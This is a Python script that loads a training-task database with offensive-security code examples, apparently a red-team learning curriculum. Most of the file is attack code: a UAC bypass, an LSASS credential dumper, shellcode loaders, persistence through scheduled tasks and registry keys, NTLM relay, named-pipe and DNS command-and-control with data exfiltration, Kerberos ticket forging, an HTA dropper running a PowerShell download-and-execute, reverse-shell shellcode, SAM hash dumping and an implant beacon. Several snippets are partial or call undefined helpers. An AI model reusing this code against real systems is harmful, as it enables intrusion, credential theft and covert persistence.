#!/usr/bin/env python3
"""Enhance tasks with light details (< 500 chars) with comprehensive content."""

import sqlite3
from pathlib import Path

DB_PATH = Path(__file__).parent.parent / "data" / "quest-log.db"

# Code examples stored separately to avoid quote escaping issues
CODE_EXAMPLES = {
    "directory walker": '''```cpp
#include <windows.h>
#include <string>
#include <vector>

void WalkDirectory(const std::wstring& path, std::vector<std::wstring>& results) {
    WIN32_FIND_DATAW findData;
    std::wstring searchPath = path + L"\\\\*";

    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        std::wstring name = findData.cFileName;
        if (name == L"." || name == L"..") continue;

        std::wstring fullPath = path + L"\\\\" + name;

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            WalkDirectory(fullPath, results);  // Recurse
        } else {
            results.push_back(fullPath);
        }
    } while (FindNextFileW(hFind, &findData));

    FindClose(hFind);
}
```''',

    "uac bypass": '''```cpp
// Fodhelper UAC Bypass
#include <windows.h>

bool BypassUAC(const wchar_t* payload) {
    HKEY hKey;

    // Create registry key that fodhelper will read
    if (RegCreateKeyExW(HKEY_CURRENT_USER,
        L"Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command",
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
        return false;

    // Set default value to our payload
    RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)payload,
                   (wcslen(payload) + 1) * sizeof(wchar_t));

    // Set DelegateExecute to empty string
    RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (BYTE*)L"", sizeof(wchar_t));
    RegCloseKey(hKey);

    // Launch fodhelper - executes our payload elevated
    ShellExecuteW(NULL, L"open", L"fodhelper.exe", NULL, NULL, SW_HIDE);

    Sleep(2000);

    // Cleanup
    RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\\\Classes\\\\ms-settings");
    return true;
}
```''',

    "lsass": '''```cpp
#include <windows.h>
#include <dbghelp.h>
#include <tlhelp32.h>

DWORD GetLsassPid() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = { sizeof(pe) };

    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                CloseHandle(snap);
                return pe.th32ProcessID;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return 0;
}

bool DumpLsass(const wchar_t* outputPath) {
    DWORD pid = GetLsassPid();
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    HANDLE hFile = CreateFileW(outputPath, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    BOOL success = MiniDumpWriteDump(hProcess, pid, hFile,
        MiniDumpWithFullMemory, NULL, NULL, NULL);

    CloseHandle(hFile);
    CloseHandle(hProcess);
    return success;
}
```''',

    "loader": '''```cpp
// Shellcode loader with various execution methods
void ExecuteShellcode(unsigned char* shellcode, size_t size) {
    // Method 1: VirtualAlloc + CreateThread
    void* exec = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE,
                              PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, size);

    HANDLE hThread = CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
}

void ExecuteViaCallback(unsigned char* shellcode, size_t size) {
    // Method 2: Callback execution (stealthier - no CreateThread)
    void* exec = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE,
                              PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, size);

    // Use EnumFonts callback
    EnumFontsW(GetDC(NULL), NULL, (FONTENUMPROCW)exec, 0);
}
```''',

    "scheduled task": '''```cpp
#include <taskschd.h>

bool CreatePersistenceTask(const wchar_t* taskName, const wchar_t* exePath) {
    CoInitialize(NULL);

    ITaskService* pService = NULL;
    CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
                     IID_ITaskService, (void**)&pService);
    pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());

    ITaskFolder* pFolder = NULL;
    pService->GetFolder(_bstr_t(L"\\\\"), &pFolder);

    ITaskDefinition* pTask = NULL;
    pService->NewTask(0, &pTask);

    // Set trigger - run at logon
    ITriggerCollection* pTriggers = NULL;
    pTask->get_Triggers(&pTriggers);
    ITrigger* pTrigger = NULL;
    pTriggers->Create(TASK_TRIGGER_LOGON, &pTrigger);

    // Set action - run our executable
    IActionCollection* pActions = NULL;
    pTask->get_Actions(&pActions);
    IAction* pAction = NULL;
    pActions->Create(TASK_ACTION_EXEC, &pAction);
    IExecAction* pExecAction = NULL;
    pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
    pExecAction->put_Path(_bstr_t(exePath));

    // Register task
    IRegisteredTask* pRegistered = NULL;
    pFolder->RegisterTaskDefinition(_bstr_t(taskName), pTask,
        TASK_CREATE_OR_UPDATE, _variant_t(), _variant_t(),
        TASK_LOGON_INTERACTIVE_TOKEN, _variant_t(L""), &pRegistered);

    return true;
}
```''',

    "ntlm relay": '''```python
import socket
import struct

class NTLMRelay:
    def __init__(self, target_host, target_port=445):
        self.target = (target_host, target_port)
        self.target_sock = None

    def relay_type1(self, type1_msg):
        """Forward Type 1 to target, get Type 2 back."""
        self.target_sock = socket.socket()
        self.target_sock.connect(self.target)

        # Send SMB negotiate + Type 1
        self._send_smb_negotiate()
        self._send_smb_session_setup(type1_msg)

        # Receive Type 2 challenge from target
        response = self.target_sock.recv(4096)
        type2_msg = self._extract_ntlm_from_smb(response)
        return type2_msg

    def relay_type3(self, type3_msg):
        """Forward Type 3 to target, complete auth."""
        self._send_smb_session_setup(type3_msg)
        response = self.target_sock.recv(4096)

        # Check if authentication succeeded
        status = struct.unpack('<I', response[9:13])[0]
        return status == 0  # STATUS_SUCCESS
```''',

    "named pipe": '''```cpp
// SMB Named Pipe C2 Server
HANDLE CreateC2Pipe() {
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };

    return CreateNamedPipeW(
        L"\\\\\\\\.\\\\pipe\\\\msagent_dp",  // Blend with legitimate names
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES,
        4096, 4096, 0, &sa);
}

void ServeC2(HANDLE hPipe) {
    char buffer[4096];
    DWORD bytesRead;

    while (ConnectNamedPipe(hPipe, NULL) ||
           GetLastError() == ERROR_PIPE_CONNECTED) {
        if (ReadFile(hPipe, buffer, sizeof(buffer), &bytesRead, NULL)) {
            char* result = ExecuteCommand(buffer);
            DWORD bytesWritten;
            WriteFile(hPipe, result, strlen(result), &bytesWritten, NULL);
        }
        DisconnectNamedPipe(hPipe);
    }
}

// Client connection
HANDLE ConnectToC2(const wchar_t* target) {
    wchar_t pipePath[256];
    swprintf(pipePath, L"\\\\\\\\%s\\\\pipe\\\\msagent_dp", target);

    return CreateFileW(pipePath, GENERIC_READ | GENERIC_WRITE,
                       0, NULL, OPEN_EXISTING, 0, NULL);
}
```''',

    "golden ticket": '''```python
from impacket.krb5 import constants
from impacket.krb5.crypto import Key, _enctype_table
import datetime

def forge_golden_ticket(domain, domain_sid, krbtgt_hash, user, groups=[513, 512, 520]):
    """Forge a Golden Ticket using krbtgt hash."""
    # Create encryption key from krbtgt hash
    key = Key(constants.EncryptionTypes.rc4_hmac.value,
              bytes.fromhex(krbtgt_hash))

    # Build PAC with high-privilege groups
    pac = build_pac(user, domain, domain_sid, groups)

    # Build EncTicketPart
    enc_ticket = EncTicketPart()
    enc_ticket['flags'] = get_ticket_flags()
    enc_ticket['key'] = generate_session_key()
    enc_ticket['crealm'] = domain.upper()
    enc_ticket['cname'] = Principal(user)
    enc_ticket['authtime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
    enc_ticket['endtime'] = KerberosTime.to_asn1(
        datetime.datetime.utcnow() + datetime.timedelta(days=365*10))
    enc_ticket['authorization-data'] = pac

    # Encrypt with krbtgt key
    cipher = _enctype_table[key.enctype]
    encrypted = cipher.encrypt(key, 2, encoder.encode(enc_ticket), None)

    return build_tgt(domain, encrypted)
```''',

    "dns c2": '''```python
import dns.resolver
import base64

class DNSC2Client:
    def __init__(self, c2_domain, dns_server='8.8.8.8'):
        self.c2_domain = c2_domain
        self.dns_server = dns_server
        self.agent_id = self._generate_agent_id()

    def beacon(self):
        """Get commands via DNS TXT query."""
        query_name = f"{self.agent_id}.cmd.{self.c2_domain}"

        try:
            answers = dns.resolver.resolve(query_name, 'TXT')
            for rdata in answers:
                cmd = base64.b64decode(str(rdata).strip('"')).decode()
                return cmd
        except:
            return None

    def send_result(self, result):
        """Exfiltrate data via DNS queries."""
        encoded = base64.b64encode(result.encode()).decode()
        chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]

        for i, chunk in enumerate(chunks):
            query_name = f"{chunk}.{i}.{len(chunks)}.{self.agent_id}.data.{self.c2_domain}"
            try:
                dns.resolver.resolve(query_name, 'A')
            except:
                pass  # Data is in the query itself
```''',

    "phishing": '''```python
def create_hta_dropper(payload_url, output_path):
    """Create HTA file that executes PowerShell."""
    hta_content = """<html><head>
<script language="VBScript">
Sub RunPS
    Set shell = CreateObject("Wscript.Shell")
    cmd = "powershell -w hidden -ep bypass -c ""IEX(New-Object Net.WebClient).DownloadString('""" + payload_url + """')"""
    shell.Run cmd, 0, False
End Sub
RunPS
</script></head></html>"""

    with open(output_path, 'w') as f:
        f.write(hta_content)

def create_lnk_payload(target_cmd, output_path):
    """Create malicious LNK shortcut."""
    import pylnk3
    lnk = pylnk3.Lnk()
    lnk.target = "C:\\\\Windows\\\\System32\\\\cmd.exe"
    lnk.arguments = f"/c {target_cmd}"
    lnk.icon = "C:\\\\Windows\\\\System32\\\\shell32.dll"
    lnk.icon_index = 1  # Folder icon
    lnk.save(output_path)
```''',

    "registry persistence": '''```cpp
#include <windows.h>

bool AddRunKey(const wchar_t* name, const wchar_t* path, bool allUsers) {
    HKEY hKey;
    const wchar_t* keyPath = allUsers ?
        L"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run" :
        L"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run";

    HKEY root = allUsers ? HKEY_LOCAL_MACHINE : HKEY_CURRENT_USER;

    if (RegOpenKeyExW(root, keyPath, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS)
        return false;

    LSTATUS status = RegSetValueExW(hKey, name, 0, REG_SZ,
        (BYTE*)path, (wcslen(path) + 1) * sizeof(wchar_t));

    RegCloseKey(hKey);
    return status == ERROR_SUCCESS;
}

bool AddUserInit(const wchar_t* path) {
    // UserInit persistence - runs before shell
    HKEY hKey;
    RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon",
        0, KEY_READ | KEY_WRITE, &hKey);

    wchar_t existing[1024];
    DWORD size = sizeof(existing);
    RegQueryValueExW(hKey, L"Userinit", NULL, NULL, (BYTE*)existing, &size);

    wchar_t newValue[2048];
    swprintf(newValue, L"%s,%s", existing, path);

    RegSetValueExW(hKey, L"Userinit", 0, REG_SZ,
        (BYTE*)newValue, (wcslen(newValue) + 1) * sizeof(wchar_t));

    RegCloseKey(hKey);
    return true;
}
```''',

    "silver ticket": '''```python
def forge_silver_ticket(target_spn, domain, domain_sid, service_hash, user):
    """Forge Silver Ticket for specific service."""
    service, target_host = target_spn.split('/')

    # Build ticket encrypted with service account key (not krbtgt)
    key = Key(constants.EncryptionTypes.rc4_hmac.value,
              bytes.fromhex(service_hash))

    pac = build_pac(user, domain, domain_sid, [513, 512])

    enc_ticket = EncTicketPart()
    enc_ticket['flags'] = get_ticket_flags()
    enc_ticket['key'] = generate_session_key()
    enc_ticket['crealm'] = domain.upper()
    enc_ticket['cname'] = Principal(user)
    enc_ticket['authtime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
    enc_ticket['endtime'] = KerberosTime.to_asn1(
        datetime.datetime.utcnow() + datetime.timedelta(hours=10))
    enc_ticket['authorization-data'] = pac

    cipher = _enctype_table[key.enctype]
    encrypted = cipher.encrypt(key, 2, encoder.encode(enc_ticket), None)

    return build_tgs(domain, target_spn, encrypted)
```''',

    "packet sniffer": '''```python
from scapy.all import sniff, TCP, Raw, IP
import re
import base64

class PacketSniffer:
    def __init__(self, interface=None):
        self.interface = interface
        self.credentials = []

    def packet_callback(self, pkt):
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            payload = pkt[Raw].load.decode('utf-8', errors='ignore')

            # HTTP Basic Auth
            if 'Authorization: Basic' in payload:
                match = re.search(r'Authorization: Basic ([A-Za-z0-9+/=]+)', payload)
                if match:
                    creds = base64.b64decode(match.group(1)).decode()
                    self.credentials.append(('HTTP Basic', creds, pkt[IP].dst))

            # FTP credentials
            if payload.startswith('USER ') or payload.startswith('PASS '):
                self.credentials.append(('FTP', payload.strip(), pkt[IP].dst))

    def start(self, filter_str="tcp port 80 or tcp port 21"):
        sniff(iface=self.interface, filter=filter_str,
              prn=self.packet_callback, store=0)
```''',

    "sam dump": '''```python
from impacket.examples.secretsdump import LocalOperations, SAMHashes

def dump_sam_hashes():
    """Dump SAM hashes (requires SYSTEM privileges)."""
    local_ops = LocalOperations("127.0.0.1")
    bootkey = local_ops.getBootKey()

    sam_hashes = SAMHashes(sam_file, bootkey)
    sam_hashes.dump()

    return sam_hashes.get_hashes()

def dump_sam_shadowcopy():
    """Extract SAM from VSS shadow copy."""
    import subprocess

    # Create shadow copy
    subprocess.run(['vssadmin', 'create', 'shadow', '/for=C:'], check=True)

    # Copy SAM and SYSTEM from shadow
    # shadowcopy_path\\Windows\\System32\\config\\SAM
    # shadowcopy_path\\Windows\\System32\\config\\SYSTEM
```''',

    "shellcode generator": '''```python
import struct

def generate_reverse_shell_x64(ip, port):
    """Generate x64 Windows reverse shell shellcode."""
    ip_bytes = bytes(map(int, ip.split('.')))
    port_bytes = struct.pack('>H', port)

    shellcode = (
        b"\\x48\\x31\\xc0"              # xor rax, rax
        b"\\x48\\x31\\xd2"              # xor rdx, rdx
        b"\\x48\\x31\\xf6"              # xor rsi, rsi
        # ... WSAStartup, socket, connect ...
        b"\\x6a\\x02\\x5f"              # push 2; pop rdi (AF_INET)
        b"\\x6a\\x01\\x5e"              # push 1; pop rsi (SOCK_STREAM)
        # ... rest of shellcode ...
    )

    # Insert IP and port at placeholders
    shellcode = shellcode.replace(b"\\xc0\\xa8\\x01\\x01", ip_bytes)
    shellcode = shellcode.replace(b"\\x01\\xbb", port_bytes)

    return shellcode

def xor_encode(shellcode, key=0x41):
    """XOR encode to avoid bad characters."""
    return bytes([b ^ key for b in shellcode])
```''',

    "psexec": '''```python
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import transport, scmr
import random, string

class SimplePsExec:
    def __init__(self, target, username, password, domain=''):
        self.target = target
        self.username = username
        self.password = password
        self.domain = domain
        self.service_name = ''.join(random.choices(string.ascii_letters, k=8))

    def execute(self, command):
        smb = SMBConnection(self.target, self.target)
        smb.login(self.username, self.password, self.domain)

        rpctransport = transport.DCERPCTransportFactory(
            f'ncacn_np:{self.target}[\\\\pipe\\\\svcctl]')
        rpctransport.set_smb_connection(smb)

        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(scmr.MSRPC_UUID_SCMR)

        resp = scmr.hROpenSCManagerW(dce)
        sc_handle = resp['lpScHandle']

        resp = scmr.hRCreateServiceW(dce, sc_handle, self.service_name,
            self.service_name, lpBinaryPathName=f'cmd.exe /c {command}')
        service_handle = resp['lpServiceHandle']

        try:
            scmr.hRStartServiceW(dce, service_handle)
        except:
            pass

        scmr.hRDeleteService(dce, service_handle)
```''',

    "memory": '''```cpp
#include <windows.h>
#include <vector>

class ProcessMemory {
public:
    ProcessMemory(DWORD pid) {
        hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE |
                               PROCESS_VM_OPERATION, FALSE, pid);
    }

    std::vector<BYTE> Read(LPVOID address, SIZE_T size) {
        std::vector<BYTE> buffer(size);
        SIZE_T bytesRead;

        if (ReadProcessMemory(hProcess, address, buffer.data(), size, &bytesRead))
            buffer.resize(bytesRead);
        else
            buffer.clear();

        return buffer;
    }

    bool Write(LPVOID address, const std::vector<BYTE>& data) {
        SIZE_T bytesWritten;
        return WriteProcessMemory(hProcess, address, data.data(),
                                  data.size(), &bytesWritten);
    }

    LPVOID FindPattern(const BYTE* pattern, const char* mask, SIZE_T size) {
        MEMORY_BASIC_INFORMATION mbi;
        LPVOID address = nullptr;

        while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
            if (mbi.State == MEM_COMMIT) {
                auto buffer = Read(mbi.BaseAddress, mbi.RegionSize);
                // Pattern matching logic...
            }
            address = (LPVOID)((BYTE*)mbi.BaseAddress + mbi.RegionSize);
        }
        return nullptr;
    }

private:
    HANDLE hProcess;
};
```''',

    "implant": '''```go
package implant

type Implant struct {
    ID       string
    Hostname string
    C2       C2Client
    Modules  map[string]Module
}

type Command struct {
    ID     string   `json:"id"`
    Module string   `json:"module"`
    Action string   `json:"action"`
    Args   []string `json:"args"`
}

func (i *Implant) Run() {
    for {
        commands := i.C2.Beacon(i.ID)

        for _, cmd := range commands {
            result := i.ExecuteCommand(cmd)
            i.C2.SendResult(result)
        }

        jitter := time.Duration(rand.Intn(30)) * time.Second
        time.Sleep(i.C2.Interval + jitter)
    }
}

func (i *Implant) ExecuteCommand(cmd Command) Result {
    module, ok := i.Modules[cmd.Module]
    if !ok {
        return Result{Success: false, Error: "unknown module"}
    }

    output, err := module.Execute(cmd.Action, cmd.Args)
    return Result{Success: err == nil, Output: output}
}
```''',
}

# Overview text for each task type
OVERVIEWS = {
    "directory walker": "Recursively enumerate filesystem directories with filtering - essential for reconnaissance and file discovery.",
    "uac bypass": "Bypass User Account Control to elevate privileges without triggering UAC prompts using registry hijacking techniques.",
    "lsass": "Dump LSASS process memory to extract credentials - core credential harvesting technique requiring SeDebugPrivilege.",
    "loader": "Implement various loader techniques to execute shellcode payloads while evading security controls.",
    "dropper": "Implement various loader techniques to execute shellcode payloads while evading security controls.",
    "scheduled task": "Create scheduled tasks for persistence - survives reboots and runs with specified privileges.",
    "ntlm relay": "Implement NTLM relay attack to forward captured authentication to another service for unauthorized access.",
    "named pipe": "Implement C2 communication over SMB named pipes for internal network traversal and covert channels.",
    "golden ticket": "Generate Kerberos Golden Tickets for domain persistence using the KRBTGT hash - ultimate domain persistence.",
    "dns c2": "Implement DNS-based C2 channel using TXT records for covert command and control over restrictive networks.",
    "phishing": "Generate convincing phishing payloads with various delivery mechanisms for initial access.",
    "registry persistence": "Establish persistence through registry Run keys and other auto-start locations.",
    "silver ticket": "Generate Kerberos Silver Tickets for service-specific access using service account hashes.",
    "packet sniffer": "Capture and analyze network packets for credential harvesting and network reconnaissance.",
    "sam": "Extract password hashes from the SAM database for offline cracking using registry or shadow copies.",
    "shellcode": "Generate position-independent shellcode for various payloads with bad character avoidance.",
    "psexec": "Implement PsExec-style remote command execution over SMB using service control manager.",
    "memory reader": "Read and write memory of remote processes for credential extraction and code injection.",
    "memory writer": "Read and write memory of remote processes for credential extraction and code injection.",
    "implant": "Build the core implant framework with modular command execution and C2 communication.",
    "wmi event": "Establish persistence through WMI event subscriptions that survive reboots.",
    "packer": "Implement a PE packer to compress and encrypt executables for AV evasion.",
    "dcom": "Implement DCOM-based lateral movement using MMC20 or ShellWindows objects.",
    "artifact": "Clean up forensic artifacts to remove evidence of compromise and hinder investigation.",
    "ssp": "Install a malicious Security Support Provider for credential capture on authentication.",
    "c2 traffic": "Implement traffic blending techniques to disguise C2 as legitimate web traffic.",
}


def get_code_example(title):
    """Get code example for a task title."""
    title_lower = title.lower()
    for key, code in CODE_EXAMPLES.items():
        if key in title_lower:
            return code
    return None


def get_overview(title):
    """Get overview text for a task title."""
    title_lower = title.lower()
    for key, overview in OVERVIEWS.items():
        if key in title_lower:
            return overview
    return None


def generate_comprehensive_details(task):
    """Generate comprehensive details for a task."""
    title = task["title"]
    path = task["path_name"]

    lines = ["## Overview"]

    # Get specific overview or generate generic one
    overview = get_overview(title)
    if overview:
        lines.append(overview)
    else:
        lines.append(f"Implement {title} - a critical component for security operations and tool development.")

    lines.append("\n### Implementation")

    # Get specific code example or use generic guidance
    code = get_code_example(title)
    if code:
        lines.append(code)
    else:
        lines.append("Follow the structured implementation approach:")
        lines.append("1. Design the core data structures and interfaces")
        lines.append("2. Implement the main functionality")
        lines.append("3. Add error handling and edge cases")
        lines.append("4. Test thoroughly in isolated environment")

    # Common sections
    lines.append("\n### Key Concepts")
    lines.append("- Understand the underlying mechanism before coding")
    lines.append("- Handle edge cases and error conditions gracefully")
    lines.append("- Test in isolated lab environment")
    lines.append("- Consider operational security implications")
    lines.append("- Document your implementation decisions")

    lines.append("\n### Practice")
    lines.append("- [ ] Implement the core functionality")
    lines.append("- [ ] Add comprehensive error handling")
    lines.append("- [ ] Write tests for critical paths")
    lines.append("- [ ] Test in realistic environment")
    lines.append("- [ ] Review for security issues")

    lines.append("\n### Completion Criteria")
    lines.append("- [ ] Feature works correctly in all scenarios")
    lines.append("- [ ] Edge cases handled properly")
    lines.append("- [ ] Code is clean and well-documented")
    lines.append("- [ ] Can explain the implementation to others")
    lines.append("- [ ] Tested in lab environment")

    return "\n".join(lines)


def main():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()

    cursor.execute("""
        SELECT t.id, t.title, t.description, p.name as path_name
        FROM tasks t
        JOIN modules m ON t.module_id = m.id
        JOIN paths p ON m.path_id = p.id
        WHERE length(t.details) < 500
        ORDER BY length(t.details) ASC
    """)

    tasks = [dict(row) for row in cursor.fetchall()]
    print(f"Found {len(tasks)} tasks with light details...")

    updated = 0
    for task in tasks:
        new_details = generate_comprehensive_details(task)
        cursor.execute(
            "UPDATE tasks SET details = ? WHERE id = ?",
            (new_details, task["id"])
        )
        updated += 1
        if updated % 10 == 0:
            print(f"  Enhanced {updated} tasks...")

    conn.commit()
    conn.close()

    print(f"\nDone! Enhanced {updated} tasks with comprehensive details.")


if __name__ == "__main__":
    main()
